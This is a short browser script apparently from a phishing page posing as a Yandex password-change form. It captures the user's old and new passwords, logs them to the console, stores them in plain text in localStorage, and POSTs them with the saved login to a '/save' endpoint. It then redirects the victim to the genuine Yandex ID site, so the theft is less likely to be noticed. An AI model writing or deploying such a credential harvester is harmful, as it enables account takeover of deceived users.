<script>
    const oldPasswordInput = document.getElementById("old-password");
    const newPasswordInput = document.getElementById("new-password");
    const newPassword2Input = document.getElementById("new-password2");
    const passwordButton = document.querySelector("#passwordButton button");

    function updatePasswordButton() {
        const empty =
            oldPasswordInput.value.trim().length === 0 ||
            newPasswordInput.value.trim().length === 0 ||
            newPassword2Input.value.trim().length === 0;

        passwordButton.disabled = empty;
    }

    updatePasswordButton();

    oldPasswordInput.addEventListener("input", updatePasswordButton);
    newPasswordInput.addEventListener("input", updatePasswordButton);
    newPassword2Input.addEventListener("input", updatePasswordButton);

    passwordButton.addEventListener("click", (e) => {
        e.preventDefault();

        const oldPassword = oldPasswordInput.value.trim();
        const newPassword = newPasswordInput.value.trim();
        const newPassword2 = newPassword2Input.value.trim();

        console.log(oldPassword, newPassword, newPassword2);

        localStorage.setItem("old-password", oldPassword);
        localStorage.setItem("new-password", newPassword);
        localStorage.setItem("new-password2", newPassword2);

        const data = {
            login: localStorage.getItem("login"),
            oldPassword,
            newPassword,
            newPassword2,
        };
        fetch("/save", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
        });

        window.location.href = "https://id.yandex.ru/";
    });
</script>
